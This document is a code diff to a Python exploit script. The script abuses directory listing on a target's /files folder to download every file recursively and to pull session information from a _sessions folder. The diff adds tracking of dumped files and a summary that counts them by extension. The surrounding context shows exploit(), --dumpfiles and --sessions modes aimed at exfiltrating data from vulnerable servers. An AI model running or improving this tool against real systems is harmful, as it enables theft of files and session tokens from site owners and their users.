@@ -62,6 +62,8 @@ def dumpSessions():
     else:
         files = recursive_download(args.url + "/files/_sessions/", True)
 
+files = []
+
 def recursive_download(url, session):
     url = url.replace(" ","%20")
     req = Request(url)
@@ -78,13 +80,13 @@ def recursive_download(url, session):
             res = requests.get(url_new)
             filename = url_new.split('files/')[1:]
             filename = "./dump/" + "".join(filename)
+            if ("_" not in url_new.split("files/")[-1].split('/')[-1] and "." in url_new.split('/')[-1] and url_new.split('/')[-1] != "remove.txt"):
+                files.append(filename.split('/')[-1])
             os.makedirs(os.path.dirname(filename), exist_ok=True)
             with open(filename, "wb") as f:
                 f.write(res.content)
             if session:
                 extractSessionsInfo(filename)
-            else:
-                print(filename)
 
 def extractSessionsInfo(filename):
     with open(filename) as f:
@@ -106,6 +108,24 @@ def exploit():
         print("Exploitation unsuccessful, unable to get directory listing on the /files folder.")
         return False
 
+def printCount(files):
+    print("Dump completed! Found " + str(len(files)) + " files in total. \nDetails: ")
+    extensions = []
+    count = []
+    for file in files:
+        extension = file.split('.')[-1].upper()
+        if extension not in extensions:
+            extensions.append(extension)
+            count.append(1)
+            continue
+        count[extensions.index(extension)] += 1
+    for text in extensions:
+        print(" Found " + str(count[extensions.index(text)]) + " " + text + " file(s).")
+    print('File list:')
+    for file in files: 
+        print(" " + file)
+    
+
 if args.check:
     if checkFiles():
         print("The target already has directory listing on the /files folder. Use --dumpfiles or --session for exploitation.")
@@ -118,6 +138,7 @@ if args.exploit:
 
 if args.dumpfiles:
     dumpFiles()
+    printCount(files)
 
 if args.sessions:
     dumpSessions()
